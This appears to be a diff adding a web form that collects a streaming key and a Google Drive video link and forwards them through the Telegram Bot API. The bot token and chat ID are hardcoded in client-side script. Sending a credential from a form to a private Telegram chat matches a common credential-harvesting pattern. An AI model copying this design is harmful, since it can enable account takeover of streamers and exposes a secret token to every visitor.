@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Stream Details Submission</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f8ff;
+            color: #333;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background: #ffffff;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+            padding: 20px;
+            width: 100%;
+            max-width: 400px;
+        }
+        h1 {
+            font-size: 1.5em;
+            color: #0078d4;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 1em;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #0078d4;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            font-size: 1em;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #005a9e;
+        }
+        .response {
+            margin-top: 15px;
+            padding: 10px;
+            border-radius: 5px;
+            font-size: 0.9em;
+            text-align: center;
+        }
+        .response.success {
+            background-color: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+        .response.error {
+            background-color: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Submit Stream Details</h1>
+        <form id="streamForm">
+            <div class="form-group">
+                <label for="streamKey">Stream Key</label>
+                <input type="text" id="streamKey" placeholder="Enter stream key" required>
+            </div>
+            <div class="form-group">
+                <label for="videoLink">Video Link</label>
+                <input type="text" id="videoLink" placeholder="Enter Google Drive link" required>
+            </div>
+            <button type="submit">Send Details</button>
+        </form>
+        <div id="responseMessage" class="response" style="display: none;"></div>
+    </div>
+
+    <script>
+        document.getElementById('streamForm').addEventListener('submit', async function(event) {
+            event.preventDefault();
+
+            const streamKey = document.getElementById('streamKey').value.trim();
+            const videoLink = document.getElementById('videoLink').value.trim();
+            const botToken = "7313369566:AAHsSy_ldhBKmVlmk5K8pVkFZzZaxCSSFIs";
+            const chatId = "7452014606";
+            const responseMessage = document.getElementById('responseMessage');
+
+            // Validation regex
+            const streamKeyRegex = /^[a-zA-Z0-9]{4}-[a-zA-Z0-9]{4}-[a-zA-Z0-9]{4}-[a-zA-Z0-9]{4}-[a-zA-Z0-9]{4}$/;
+            const googleDriveRegex = /^https:\/\/drive\.google\.com\/file\/d\/[a-zA-Z0-9_-]+\/view\?usp=drive_link$/;
+
+            if (!streamKeyRegex.test(streamKey)) {
+                responseMessage.textContent = "❌ Invalid stream key format. Ensure it follows the pattern XXXX-XXXX-XXXX-XXXX-XXXX.";
+                responseMessage.className = "response error";
+                responseMessage.style.display = "block";
+                return;
+            }
+
+            if (!googleDriveRegex.test(videoLink)) {
+                responseMessage.textContent = "❌ Invalid Google Drive link. Ensure it is a valid file link.";
+                responseMessage.className = "response error";
+                responseMessage.style.display = "block";
+                return;
+            }
+
+            const message = `📹 *Stream Details Submitted*\n\n🔑 *Stream Key:* \`${streamKey}\`\n📥 *Video Link:* [Google Drive Link](${videoLink})`;
+            const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            try {
+                const response = await fetch(telegramApiUrl, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                        parse_mode: "Markdown"
+                    })
+                });
+
+                const result = await response.json();
+                console.log("Telegram API Response:", result);
+
+                if (result.ok) {
+                    responseMessage.textContent = "✅ Details sent successfully!";
+                    responseMessage.className = "response success";
+                } else {
+                    console.error("Telegram API Error:", result);
+                    responseMessage.textContent = "❌ Failed to send details. Please try again.";
+                    responseMessage.className = "response error";
+                }
+            } catch (error) {
+                console.error("Fetch Error:", error);
+                responseMessage.textContent = "❌ An error occurred. Please check your connection.";
+                responseMessage.className = "response error";
+            }
+
+            responseMessage.style.display = "block";
+        });
+    </script>
+</body>
+</html>
